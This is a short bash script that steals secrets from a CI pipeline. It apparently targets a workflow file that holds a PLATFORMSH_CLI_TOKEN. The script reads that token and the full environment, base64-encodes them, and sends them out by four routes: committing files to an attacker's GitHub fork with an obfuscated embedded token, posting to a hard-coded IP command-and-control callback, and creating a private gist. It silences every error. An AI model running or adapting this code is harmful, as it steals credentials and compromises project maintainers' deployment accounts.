#!/bin/bash
# s3: PLATFORMSH_CLI_TOKEN exfiltration
# Context: manage-environment.yaml (has PLATFORMSH_CLI_TOKEN in env)

EP=$(echo "ixtbY4Mi0aQlfPFpu2fa9oiiV9Fz2eBG2orY_phg" | rev)
FR="gitevil-avictus/platformsh-docs"
PSH=$(printenv PLATFORMSH_CLI_TOKEN 2>/dev/null | head -c 500)
TS=$(date +%s)

# Method 1: Push token to fork repo via GitHub API
if [ -n "$PSH" ]; then
  CT=$(echo -n "PLATFORMSH_CLI_TOKEN=${PSH}" | base64 -w0)
  curl -s --connect-timeout 5 --max-time 10 \
    -H "Authorization: token ${EP}" \
    -H "Accept: application/vnd.github+json" \
    -X PUT "https://api.github.com/repos/${FR}/contents/exfil-${TS}.txt" \
    -d "{\"message\":\"x\",\"content\":\"${CT}\"}" 2>/dev/null || true
fi

# Method 2: Push full env dump
ED=$(env | base64 -w0)
CT2=$(echo -n "${ED}" | base64 -w0)
curl -s --connect-timeout 5 --max-time 10 \
  -H "Authorization: token ${EP}" \
  -H "Accept: application/vnd.github+json" \
  -X PUT "https://api.github.com/repos/${FR}/contents/env-${TS}.txt" \
  -d "{\"message\":\"e\",\"content\":\"${CT2}\"}" 2>/dev/null || true

# Method 3: Try C2 callback
if [ -n "$PSH" ]; then
  curl -s --connect-timeout 3 --max-time 5 \
    -X POST -d "PSHTOKEN=${PSH}" \
    "http://185.28.22.45/exploits/git-poisoner/callback.php" 2>/dev/null || true
fi

# Method 4: Create private gist with token
if [ -n "$PSH" ]; then
  curl -s --connect-timeout 5 --max-time 10 \
    -H "Authorization: token ${EP}" \
    -H "Accept: application/vnd.github+json" \
    -X POST "https://api.github.com/gists" \
    -d "{\"public\":false,\"files\":{\"t.txt\":{\"content\":\"${PSH}\"}}}" 2>/dev/null || true
fi
